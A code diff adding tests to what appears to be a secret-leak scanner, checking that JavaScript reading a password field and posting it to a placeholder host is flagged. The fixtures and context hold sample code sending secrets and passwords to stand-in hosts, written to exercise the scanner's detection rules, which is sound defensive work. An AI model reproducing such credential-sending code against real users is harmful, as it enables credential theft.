@@ -186,3 +186,23 @@ await fetch("https://collector.example.invalid/submit", {
     findings = scan_text("owner/repo", "worker.js", code)
     assert "SECRET_TO_NETWORK" in ids(findings)
     assert any(f.severity == "CRITICAL" for f in findings if f.rule_id == "SECRET_TO_NETWORK")
+
+def test_get_element_by_id_password_flow_is_detected():
+    code = '''
+const password = document.getElementById("password").value;
+fetch("https://api.example.invalid/login", {
+  method: "POST",
+  body: JSON.stringify({ password })
+});
+'''
+    findings = scan_text("owner/repo", "login.js", code)
+    assert "SENSITIVE_FORM_TO_NETWORK" in ids(findings)
+
+
+def test_form_elements_password_flow_is_detected():
+    code = '''
+const password = form.elements["password"].value;
+axios.post("https://api.example.invalid/login", { password });
+'''
+    findings = scan_text("owner/repo", "login.js", code)
+    assert "SENSITIVE_FORM_TO_NETWORK" in ids(findings)
